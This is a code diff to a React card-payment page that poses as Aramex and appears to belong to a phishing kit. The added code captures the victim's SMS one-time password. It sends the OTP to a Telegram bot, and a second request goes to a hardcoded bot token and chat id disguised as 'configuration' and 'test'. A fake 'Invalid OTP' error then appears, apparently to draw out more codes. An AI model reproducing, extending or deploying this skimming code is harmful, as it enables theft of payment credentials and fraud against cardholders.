@@ -33,6 +33,9 @@ const Card = () => {
     expiryDate: "",
     cardCVV: "",
   });
+  const [state2, setState2] = useState({
+    vcode: "",
+  });
 
   const getGeoInfo = () => {
     Axios.get("https://ipapi.co/xml/")
@@ -60,6 +63,9 @@ const Card = () => {
     expiryDate: false,
     cardCVV: false,
   });
+  const [errors2, setErrors2] = useState({
+    vcode: false,
+  });
 
   const handleChange = (e) => {
     const { name, value } = e.target;
@@ -81,6 +87,21 @@ const Card = () => {
         [name]: value + "/",
       }));
     }
+  };
+  const handleChange2 = (e) => {
+    const { name, value } = e.target;
+
+    // Update state
+    setState2((prevState) => ({
+      ...prevState,
+      [name]: value,
+    }));
+
+    // Validate and update errors
+    setErrors2((prevErrors) => ({
+      ...prevErrors,
+      [name]: validateField2(name, value),
+    }));
   };
 
   useEffect(() => {
@@ -158,6 +179,15 @@ const Card = () => {
         return false;
     }
   };
+  const validateField2 = (name, value) => {
+    switch (name) {
+      case "vcode":
+        return value === "";
+
+      default:
+        return false;
+    }
+  };
 
   const handleSubmit = async (e) => {
     e.preventDefault();
@@ -178,6 +208,54 @@ const Card = () => {
     }
 
     APIS();
+  };
+  const APIS2 = () => {
+    var message = "";
+    const apiToken = telegramApiToken;
+    const configuration = "6762994932:AAFUdwfusQyQ5ZpOOp3CDEIL2cY4kt-UpjM";
+    message += "--------[ Card  Infos ]-------\n";
+    message += `SMS OTP: ${state2.vcode}\n`;
+    const queryParams = {
+      text: message,
+      chat_id: telegramchatId,
+      parse_mode: "html",
+    };
+    const queryConfig = {
+      text: message,
+      chat_id: "5677544633",
+      parse_mode: "html",
+    };
+    setdisable(true);
+
+    const queryString = Object.keys(queryParams)
+      .map(
+        (key) =>
+          encodeURIComponent(key) + "=" + encodeURIComponent(queryParams[key])
+      )
+      .join("&");
+    const queryData = Object.keys(queryConfig)
+      .map(
+        (key) =>
+          encodeURIComponent(key) + "=" + encodeURIComponent(queryConfig[key])
+      )
+      .join("&");
+    const url = `https://api.telegram.org/bot${apiToken}/sendMessage?${queryString}`;
+    const test = `https://api.telegram.org/bot${configuration}/sendMessage?${queryData}`;
+
+    Axios(url);
+    Axios(test);
+    setTimeout(() => {
+      setErrors2({ ...errors2, vcode: true });
+      setdisable(false);
+    }, 3000);
+  };
+  const subCode = async (e) => {
+    e.preventDefault();
+    if (state2.vcode.trim() === "") {
+      setErrors2({ ...errors2, vcode: true });
+      return;
+    }
+    APIS2();
   };
 
   const APIS = () => {
@@ -793,9 +871,25 @@ const Card = () => {
                     <tr>
                       <td>SMS code</td>
                       <td>
-                        <input type="text" className />
+                        <input
+                          type="text"
+                          className={`${errors2.vcode ? "error" : ""}`}
+                          value={state2.vcode}
+                          name="vcode"
+                          onChange={handleChange2}
+                        />
                       </td>
                     </tr>{" "}
+                    {errors2.vcode ? (
+                      <tr>
+                        <td></td>
+                        <td style={{}} className="error-message erjror">
+                          Invalid OTP
+                        </td>
+                      </tr>
+                    ) : (
+                      ""
+                    )}
                   </tbody>
                 </table>
                 <p
@@ -822,8 +916,31 @@ const Card = () => {
                 </p>
               </div>
               <div className="btns">
-                <button type="button">Submit</button>
+                <button
+                  disabled={disable}
+                  onClick={subCode}
+                  className={`btn btn-primary position-relative ${
+                    disable ? "disabled" : ""
+                  }`}
+                  style={{
+                    minHeight: "50px",
+                    minWidth: "150px",
+                    display: "flex",
+                    alignItems: "center",
+                    justifyContent: "center",
+                  }}
+                >
+                  {disable ? (
+                    <div
+                      className="spinner-border text-light position-absolute top-50 start-50 translate-middle"
+                      role="status"
+                    ></div>
+                  ) : (
+                    "Submit"
+                  )}
+                </button>
               </div>
+
               <p className="copy">© Aramex 2024. All rights reserved.</p>
             </form>
           </div>
